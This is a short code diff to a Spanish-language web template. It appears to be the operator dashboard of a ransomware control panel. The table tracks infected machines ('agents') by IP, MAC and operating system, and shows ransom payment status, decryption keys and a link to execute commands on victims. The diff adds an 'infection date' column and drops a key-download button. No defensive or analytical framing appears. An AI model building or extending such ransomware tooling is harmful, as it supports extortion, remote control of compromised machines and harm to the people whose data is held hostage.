@@ -19,6 +19,7 @@
                     <th>IP</th>
                     <th>MAC</th>
                     <th>S.O</th>
+                    <th>Fecha de infección</th>
                     <th>Estado del rescate</th>
                     <th>Clave de descifrado</th>
                     <th>Gestionar agente</th>
@@ -31,6 +32,7 @@
                     <td>{{ agent.ip }}</td>
                     <td>{{ agent.mac }}</td>
                     <td>{{ agent.so }}</td>
+                    <td>{{ agent.timestamp }}</td>
                     <td> 
                         {% if agent.pay_status %}
                         ✅ Pagado
@@ -40,7 +42,6 @@
                     </td>
                     <td>
                         <a href="{{ url_for('view_private_key', agent_id=agent.id) }}" class="btn btn-green">Ver clave</a>
-                        <a href="{{ url_for('download_private_key', agent_id=agent.id) }}" class="btn btn-green">Descargar clave</a>
                     </td>
                     <td>
                         <a href="{{ url_for('execute_command', agent_id=agent.id) }}" class="btn btn-green">Ejecutar comandos</a>
